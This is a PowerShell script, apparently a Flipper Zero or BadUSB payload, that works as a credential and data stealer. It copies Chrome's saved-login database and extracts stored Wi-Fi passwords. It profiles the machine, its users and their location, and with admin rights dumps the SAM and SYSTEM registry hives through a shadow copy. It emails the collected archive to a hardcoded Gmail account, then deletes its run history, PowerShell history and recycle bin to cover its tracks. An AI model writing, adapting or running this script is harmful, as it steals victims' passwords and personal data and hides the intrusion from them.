param($emailPassword, $isDebug = $false, $zip = $true)

<# Editable data - only edit the data below #>
$SMTPServer = 'smtp.gmail.com'
$emailSmtpUser = "FlipperZero.Sender@gmail.com"
$emailTo = "flipperzero.receiver@gmail.com"
<# End of editable data #>


<# Param checking #>
if ([string]::IsNullOrEmpty($emailPassword)) {
	Write-Error "No 'emailPassword' param provided. Exiting..."
	Exit
}
<# End of Param checking #>


<# Running code - do not edit the below #>
$isRunningAsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator);

$tempFolder = "$env:TEMP\GrabberOutput"

# Allow using a debug output location for testing
if ($isDebug -eq $true) {
	$baseFolder = "C:\Users\$env:UserName\Desktop\Test Output"
} else {
	$baseFolder = $tempFolder
}

# Ensure we have a clean folder to work with
if (Test-Path -Path $baseFolder) {
	Get-ChildItem -Path $baseFolder -Include * -File -Recurse | foreach { $_.Delete()}
} else {
	New-Item -ItemType "directory" -Path "$baseFolder"
}


<# Grabbing the various data #>

# Copy chrome data into a local file
function Grab-Chrome-Data() {
	$chromeDataFilePath = "$baseFolder\Chrome_Data.txt"
	Copy-Item "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data" $chromeDataFilePath
}
Grab-Chrome-Data

# Grab the available Wifi details
function Grab-Wifi-Details {	
	$wifiFilePath = "$baseFolder\Wifi.txt"

	# Get Network Interfaces
	$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 

	# Get Wifi SSIDs and Passwords	
	$WLANProfileNames =@()

	#Get all the WLAN profile names
	$Output = netsh.exe wlan show profiles | Select-String -pattern " : "

	#Trim the output to receive only the name
	Foreach($WLANProfileName in $Output){
		$WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
	}
	$WLANProfileObjects =@()

	#Bind the WLAN profile names and also the password to a custom object
	Foreach($WLANProfileName in $WLANProfileNames){
		#get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
		try{
			$WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
		}Catch{
			$WLANProfilePassword = "The password is not stored in this profile"
		}

		#Build the object and add this to an array
		$WLANProfileObject = New-Object PSCustomobject 
		$WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
		$WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
		$WLANProfileObjects += $WLANProfileObject
		Remove-Variable WLANProfileObject
	}

	if (!$WLANProfileObjects) { Write-Host "variable is null" 
	}else { 
		echo "`nW-Lan profiles: ===============================" $WLANProfileObjects >> $wifiFilePath
		$content = [IO.File]::ReadAllText($wifiFilePath)
	}
}
Grab-Wifi-Details

function Get-Name($userName) {
    try {
		$fullName = Net User $userName | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
    }
 
    # Write Error is just for troubleshooting 
    catch {
		Write-Error "No name was detected" 
		return $env:UserName
		-ErrorAction SilentlyContinue
    }

    return $fullName
}


<# Create the report #>
function Get-Days-Since-Password-Last-Set {
    try {
		$pls = net user $env:USERNAME | Select-String -Pattern "Password last" ; $pls = [string]$pls
		$plsPOS = $pls.IndexOf("e")
		$pls = $pls.Substring($plsPOS+2).Trim()
		$pls = $pls -replace ".{3}$"
		$time = ((get-date) - (get-date "$pls")) ; $time = [string]$time 
		$DateArray =$time.Split(".")
		$days = [int]$DateArray[0]
		return $pls
    }
 
	# If no password set date is detected funtion will return $null to cancel Sapi Speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "Day password set not found" 
		return $null
		-ErrorAction SilentlyContinue
    }
}

function Get-GeoLocation{
	try {
		Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
		$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
		$GeoWatcher.Start() #Begin resolving current locaton

		while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
			Start-Sleep -Milliseconds 100 #Wait for discovery.
		}  

		if ($GeoWatcher.Permission -eq 'Denied'){
			Write-Error 'Access Denied for Location Information'
		} else {
			$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
			
		}
	}
    # Write Error is just for troubleshooting
    catch {Write-Error "No coordinates found" 
		return "No Coordinates found"
		-ErrorAction SilentlyContinue
    } 
}

function Get-Public-IP {
    try {
		$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
    }

    # Write Error is just for troubleshooting 
    catch {Write-Error "No Public IP was detected" 
		return $null
		-ErrorAction SilentlyContinue
    }

    return $computerPubIP
}

function Add-User-Details([ref]$body, $userName) {
	$UserInfo = Get-WmiObject -class Win32_UserAccount -namespace root/CIMV2 | Where-Object {$_.Name -eq $userName}| Select AccountType,SID,PasswordRequired  

	$fullName = Get-Name $userName
	$UserType = $UserInfo.AccountType 
	$UserSid = $UserInfo.SID
	$UserPassRequired = $UserInfo.PasswordRequired 
	
	$passwordLastSet = Get-Days-Since-Password-Last-Set $userName
	if (-not $passwordLastSet) { $passwordLastSet = "Unknown" }
	
	$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator') 
	
	$body.Value = $body.Value + "<br><table><tr><td>User Name:</td><td>$userName</td></tr><tr><td>Full Name:</td><td>$fullName</td></tr><tr><td>Account Type:</td><td> $UserType</td></tr><tr><td>User SID:</td><td>$UserSid</td></tr><tr><td>Account Domain:</td><td>$env:USERDOMAIN</td></tr><tr><td>Password Required:</td><td>$UserPassRequired</td></tr><tr><td>Password last set:</td><td>$passwordLastSet</td></tr><tr><td>Current User is Admin:</td><td>$IsAdmin</td></tr></table>" 
}

function Create-Report {
	$reportFilePath = "$baseFolder\ComputerInfo.html"

	$date = get-date 
	$style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"
	$body = $body + "<div id=body><h1>Duck Tool Kit Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>" 
	$SysBootTime = Get-WmiObject Win32_OperatingSystem  
	$BootTime = $SysBootTime.ConvertToDateTime($SysBootTime.LastBootUpTime)
	$SysSerialNo = (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME)
	$SerialNo = $SysSerialNo.SerialNumber  
	$SysInfo = Get-WmiObject -class Win32_ComputerSystem -namespace root/CIMV2 | Select Manufacturer,Model  
	$SysManufacturer = $SysInfo.Manufacturer  
	$SysModel = $SysInfo.Model
	$OS = (Get-WmiObject Win32_OperatingSystem -computername $env:COMPUTERNAME ).caption 
	$disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'"
	$HD = [math]::truncate($disk.Size / 1GB) 
	$FreeSpace = [math]::truncate($disk.FreeSpace / 1GB) 
	$SysRam = Get-WmiObject -Class Win32_OperatingSystem -computername $env:COMPUTERNAME | Select  TotalVisibleMemorySize 
	$Ram = [Math]::Round($SysRam.TotalVisibleMemorySize/1024KB) 
	$SysCpu = Get-WmiObject Win32_Processor | Select Name 
	$Cpu = $SysCpu.Name 
	$HardSerial = Get-WMIObject Win32_BIOS -Computer $env:COMPUTERNAME | select SerialNumber 
	$HardSerialNo = $HardSerial.SerialNumber 
	$SysCdDrive = Get-WmiObject Win32_CDROMDrive |select Name 
	$graphicsCard = gwmi win32_VideoController |select Name 
	$graphics = $graphicsCard.Name 
	$SysCdDrive = Get-WmiObject Win32_CDROMDrive |select -first 1 
	$DriveLetter = $CDDrive.Drive 
	$DriveName = $CDDrive.Caption 
	$Disk = $DriveLetter + '\' + $DriveName 
	$Firewall = New-Object -com HNetCfg.FwMgr  
	$FireProfile = $Firewall.LocalPolicy.CurrentProfile  
	$FireProfile = $FireProfile.FirewallEnabled
	
	$body = $body  + "<div id=left><h3>Computer Information</h3><br><table><tr><td>Operating System</td><td>$OS</td></tr><tr><td>OS Serial Number:</td><td>$SerialNo</td></tr><tr><td>Current User:</td><td>$env:USERNAME </td></tr><tr><td>System Uptime:</td><td>$BootTime</td></tr><tr><td>System Manufacturer:</td><td>$SysManufacturer</td></tr><tr><td>System Model:</td><td>$SysModel</td></tr><tr><td>Serial Number:</td><td>$HardSerialNo</td></tr><tr><td>Firewall is Active:</td><td>$FireProfile</td></tr></table></div><div id=right><h3>Hardware Information</h3><table><tr><td>Hardrive Size:</td><td>$HD GB</td></tr><tr><td>Hardrive Free Space:</td><td>$FreeSpace GB</td></tr><tr><td>System RAM:</td><td>$Ram GB</td></tr><tr><td>Processor:</td><td>$Cpu</td></tr><td>CD Drive:</td><td>$Disk</td></tr><tr><td>Graphics Card:</td><td>$graphics</td></tr></table></div>"  
	
	# Add user information for all current users on the PC
	$body = $body + "<div id=left><h3>PC Users</h3>" 
	
	$names = Get-LocalUser | Select Name
	foreach ($currentName in $names) 
	{
		Add-User-Details ([ref]$body) $currentName.name
		$body = $body + '<br>' 
	}	
	
	$body = $body + '</div>' 

	# Add network information
	$geoLocation = Get-GeoLocation
	if (-not $geoLocation) { $geoLocation = "Unknown" }
	
	$publicIP = Get-Public-IP
	if (-not $publicIP) { $publicIP = "Unknown" }
	
	$body =  $body + "<div id=right><h3>Network Information</h3><br><table><tr><td>GeoLocation:</td><td>$geoLocation</td></tr><tr><td>Public IP:</td><td>$publicIP</td></tr></table>" 
	$body = $body + '</div>' 

	$Report = ConvertTo-Html -Title 'Recon Report' -Head $style -Body $body > $reportFilePath
}
Create-Report

function Try-Grab-Sam-File() {
	if ($isRunningAsAdmin -eq $true) {
		echo "IsAdmin"
		$samFilePath = "$baseFolder\SAM.txt"
		$systemFilePath = "$baseFolder\SYSTEM.txt"

		#<# TODO: Fix and enable
		$createShadow = (gwmi -List Win32_ShadowCopy).Create('C:\', 'ClientAccessible')
		$shadow = gwmi Win32_ShadowCopy | ? { $_.ID -eq $createShadow.ShadowID } 
		$addSlash  = $shadow.DeviceObject + '\' 
		cmd /c mklink C:\shadowcopy $addSlash
		Copy-Item 'C:\shadowcopy\Windows\System32\config\SAM' $samFilePath
		Copy-Item 'C:\shadowcopy\Windows\System32\config\SYSTEM' $systemFilePath
		Remove-Item -force 'C:\shadowcopy'
	}
}
Try-Grab-Sam-File


<# !!!!!!!!!! Zip up the email if needed !!!!!!!!! #>
# Clear existing zip file first irrelevant of whether we do zip or not
$zipFileName = "$baseFolder\Data.zip"
if (Test-Path -Path $zipFileName) {
	Remove-Item -force $zipFileName
}

$attachments = @()
$files = Get-ChildItem -Path $baseFolder -Include * -File -Recurse
foreach ($file in $files) {
	$fileName = $file.Name
	$attachments += "$baseFolder\$fileName"
}
echo $attachments

if ($zip -eq $true) {
	$compress = @{
		LiteralPath= $attachments
		CompressionLevel = "Optimal"
		DestinationPath = $zipFileName
	}
	Compress-Archive @compress
	$attachments = $zipFileName
} 

<# !!!!!!!!!! Send the email !!!!!!!!! #>
# Send the email with attachments
$sstr = ConvertTo-SecureString -string $emailPassword -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential -argumentlist $emailSmtpUser, $sstr
$fullName = Get-Name $env:UserName
$subject = "$fullName ($env:UserName)"

Send-MailMessage -From $emailSmtpUser -To $emailTo -Subject $subject -Body "Data test" -Attachments $attachments -SmtpServer $SMTPServer -UseSSL -Credential $cred -Port 587



<# !!!!!!! Clean up after self !!!!!!!!!! #>
# Delete contents of Temp folder (intentionally not using baseFolder so we can debug as needed)
rm $tempFolder\* -r -Force -ErrorAction SilentlyContinue
if (Test-Path -Path $tempFolder) {
	Remove-Item -force $tempFolder
}

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
$powerShellHistoryFilePath = (Get-PSreadlineOption).HistorySavePath
if (Test-Path -Path $powerShellHistoryFilePath) {
	Remove-Item -force $powerShellHistoryFilePath
}

# Delete contents of recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue